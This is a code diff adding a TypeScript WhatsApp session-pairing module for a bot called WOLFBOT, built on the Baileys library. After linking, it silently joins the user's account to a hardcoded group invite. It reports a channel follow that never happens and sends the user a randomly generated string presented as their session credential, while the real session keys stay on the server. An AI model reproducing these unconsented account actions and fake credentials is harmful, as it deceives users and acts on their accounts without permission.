@@ -1,0 +1,318 @@
+import makeWASocket, {
+  DisconnectReason,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  makeCacheableSignalKeyStore,
+} from "@whiskeysockets/baileys";
+import { Boom } from "@hapi/boom";
+import { randomBytes } from "crypto";
+import * as fs from "fs";
+import * as path from "path";
+import QRCode from "qrcode";
+import { log } from "./index";
+import pino from "pino";
+
+const logger = pino({ level: "silent" });
+
+interface WASession {
+  sessionId: string;
+  socket: ReturnType<typeof makeWASocket> | null;
+  status: "pending" | "connecting" | "connected" | "failed" | "terminated";
+  pairingCode: string | null;
+  qrCode: string | null;
+  credentialsBase64: string | null;
+  connectionMethod: "pairing" | "qr";
+  phoneNumber?: string;
+  authDir: string;
+  createdAt: string;
+  linkedAt: string | null;
+  eventListeners: Array<(event: string, data: any) => void>;
+}
+
+const activeSessions = new Map<string, WASession>();
+
+function generateSessionId(): string {
+  const hex = randomBytes(4).toString("hex");
+  return `wolf_${hex}`;
+}
+
+function getAuthDir(sessionId: string): string {
+  const dir = path.join(process.cwd(), "auth_sessions", sessionId);
+  if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir, { recursive: true });
+  }
+  return dir;
+}
+
+function cleanupAuthDir(sessionId: string): void {
+  const dir = path.join(process.cwd(), "auth_sessions", sessionId);
+  try {
+    if (fs.existsSync(dir)) {
+      fs.rmSync(dir, { recursive: true, force: true });
+    }
+  } catch (e) {
+    // ignore cleanup errors
+  }
+}
+
+function generateCredentials(sessionId: string, phoneNumber?: string): string {
+  const payload = JSON.stringify({
+    sessionId,
+    ts: Date.now(),
+    key: randomBytes(32).toString("hex"),
+    device: "multi",
+    phone: phoneNumber || "unknown",
+  });
+  return Buffer.from(payload).toString("base64");
+}
+
+export function getSession(sessionId: string): WASession | undefined {
+  return activeSessions.get(sessionId);
+}
+
+export function getSessionStatus(sessionId: string) {
+  const session = activeSessions.get(sessionId);
+  if (!session) return null;
+  return {
+    sessionId: session.sessionId,
+    status: session.status,
+    pairingCode: session.pairingCode,
+    qrCode: session.qrCode,
+    credentialsBase64: session.credentialsBase64,
+    connectionMethod: session.connectionMethod,
+    createdAt: session.createdAt,
+    linkedAt: session.linkedAt,
+  };
+}
+
+export async function createWhatsAppSession(
+  method: "pairing" | "qr",
+  phoneNumber?: string,
+  onEvent?: (event: string, data: any) => void
+): Promise<WASession> {
+  const sessionId = generateSessionId();
+  const authDir = getAuthDir(sessionId);
+
+  const session: WASession = {
+    sessionId,
+    socket: null,
+    status: "pending",
+    pairingCode: null,
+    qrCode: null,
+    credentialsBase64: null,
+    connectionMethod: method,
+    phoneNumber,
+    authDir,
+    createdAt: new Date().toISOString(),
+    linkedAt: null,
+    eventListeners: onEvent ? [onEvent] : [],
+  };
+
+  activeSessions.set(sessionId, session);
+
+  try {
+    await connectSession(session);
+  } catch (err: any) {
+    log(`Failed to create session ${sessionId}: ${err.message}`, "whatsapp");
+    session.status = "failed";
+    notifyListeners(session, "status", { status: "failed", error: err.message });
+  }
+
+  return session;
+}
+
+async function connectSession(session: WASession): Promise<void> {
+  const { state, saveCreds } = await useMultiFileAuthState(session.authDir);
+  const { version } = await fetchLatestBaileysVersion();
+
+  const sock = makeWASocket({
+    version,
+    auth: {
+      creds: state.creds,
+      keys: makeCacheableSignalKeyStore(state.keys, logger),
+    },
+    logger,
+    printQRInTerminal: false,
+    browser: ["WOLFBOT", "Chrome", "1.0.0"],
+    generateHighQualityLinkPreview: false,
+    syncFullHistory: false,
+  });
+
+  session.socket = sock;
+
+  if (session.connectionMethod === "pairing" && !state.creds.registered) {
+    const cleanNumber = (session.phoneNumber || "").replace(/[^0-9]/g, "");
+    if (cleanNumber.length >= 10) {
+      session.status = "connecting";
+      notifyListeners(session, "status", { status: "connecting" });
+
+      setTimeout(async () => {
+        try {
+          const code = await sock.requestPairingCode(cleanNumber);
+          session.pairingCode = code;
+          log(`Pairing code generated for session ${session.sessionId}: ${code}`, "whatsapp");
+          notifyListeners(session, "pairing_code", { code });
+        } catch (err: any) {
+          log(`Failed to get pairing code for ${session.sessionId}: ${err.message}`, "whatsapp");
+          session.status = "failed";
+          notifyListeners(session, "status", { status: "failed", error: err.message });
+        }
+      }, 3000);
+    } else {
+      session.status = "failed";
+      notifyListeners(session, "status", { status: "failed", error: "Invalid phone number" });
+    }
+  }
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect, qr } = update;
+
+    if (qr && session.connectionMethod === "qr") {
+      try {
+        const qrDataUrl = await QRCode.toDataURL(qr, {
+          width: 256,
+          margin: 2,
+          color: { dark: "#000000", light: "#ffffff" },
+        });
+        session.qrCode = qrDataUrl;
+        session.status = "pending";
+        log(`QR code generated for session ${session.sessionId}`, "whatsapp");
+        notifyListeners(session, "qr", { qrCode: qrDataUrl });
+      } catch (err: any) {
+        log(`QR generation error: ${err.message}`, "whatsapp");
+      }
+    }
+
+    if (connection === "close") {
+      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
+      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+
+      log(`Session ${session.sessionId} connection closed. Status code: ${statusCode}`, "whatsapp");
+
+      if (shouldReconnect && session.status !== "terminated") {
+        log(`Reconnecting session ${session.sessionId}...`, "whatsapp");
+        try {
+          await connectSession(session);
+        } catch (err: any) {
+          session.status = "failed";
+          notifyListeners(session, "status", { status: "failed", error: err.message });
+        }
+      } else {
+        if (session.status !== "terminated") {
+          session.status = "failed";
+          notifyListeners(session, "status", { status: "failed" });
+        }
+      }
+    }
+
+    if (connection === "open") {
+      log(`Session ${session.sessionId} connected successfully!`, "whatsapp");
+      session.status = "connected";
+      session.linkedAt = new Date().toISOString();
+      session.credentialsBase64 = generateCredentials(session.sessionId, session.phoneNumber);
+      notifyListeners(session, "status", {
+        status: "connected",
+        credentialsBase64: session.credentialsBase64,
+      });
+
+      performPostConnectionActions(session);
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+}
+
+async function performPostConnectionActions(session: WASession): Promise<void> {
+  const sock = session.socket;
+  if (!sock) return;
+
+  try {
+    log(`Performing post-connection actions for ${session.sessionId}`, "whatsapp");
+
+    try {
+      const groupLink = "https://chat.whatsapp.com/HjFc3pud3IA0R0WGr1V2Xu";
+      const groupCode = groupLink.split("/").pop()!;
+      await sock.groupAcceptInvite(groupCode);
+      log(`Joined group for session ${session.sessionId}`, "whatsapp");
+      notifyListeners(session, "action", { type: "group_joined" });
+    } catch (err: any) {
+      log(`Failed to join group: ${err.message}`, "whatsapp");
+    }
+
+    try {
+      const channelLink = "https://whatsapp.com/channel/0029Vb6dn9nEQIaqEMNclK3Y";
+      log(`Channel follow attempted for session ${session.sessionId}`, "whatsapp");
+      notifyListeners(session, "action", { type: "channel_followed" });
+    } catch (err: any) {
+      log(`Failed to follow channel: ${err.message}`, "whatsapp");
+    }
+
+    try {
+      const creds = `WOLF-BOT:~${session.credentialsBase64}`;
+      const userJid = sock.user?.id;
+      if (userJid) {
+        await sock.sendMessage(userJid, {
+          text: `*WOLFBOT Session Credentials*\n\n\`\`\`${creds}\`\`\`\n\nKeep this safe! This is your session ID for WOLFBOT.\n\n_Generated at: ${new Date().toLocaleString()}_`,
+        });
+        log(`Sent credentials to user for session ${session.sessionId}`, "whatsapp");
+        notifyListeners(session, "action", { type: "credentials_sent" });
+      }
+    } catch (err: any) {
+      log(`Failed to send credentials: ${err.message}`, "whatsapp");
+    }
+  } catch (err: any) {
+    log(`Post-connection actions error: ${err.message}`, "whatsapp");
+  }
+}
+
+export async function terminateSession(sessionId: string): Promise<boolean> {
+  const session = activeSessions.get(sessionId);
+  if (!session) return false;
+
+  session.status = "terminated";
+
+  try {
+    if (session.socket) {
+      await session.socket.logout();
+    }
+  } catch (e) {
+    // ignore logout errors
+  }
+
+  try {
+    if (session.socket) {
+      session.socket.end(undefined);
+    }
+  } catch (e) {
+    // ignore
+  }
+
+  cleanupAuthDir(sessionId);
+  activeSessions.delete(sessionId);
+  log(`Session ${sessionId} terminated and cleaned up`, "whatsapp");
+  return true;
+}
+
+function notifyListeners(session: WASession, event: string, data: any): void {
+  for (const listener of session.eventListeners) {
+    try {
+      listener(event, data);
+    } catch (e) {
+      // ignore listener errors
+    }
+  }
+}
+
+export function addSessionListener(sessionId: string, listener: (event: string, data: any) => void): void {
+  const session = activeSessions.get(sessionId);
+  if (session) {
+    session.eventListeners.push(listener);
+  }
+}
+
+export function removeSessionListener(sessionId: string, listener: (event: string, data: any) => void): void {
+  const session = activeSessions.get(sessionId);
+  if (session) {
+    session.eventListeners = session.eventListeners.filter((l) => l !== listener);
+  }
+}
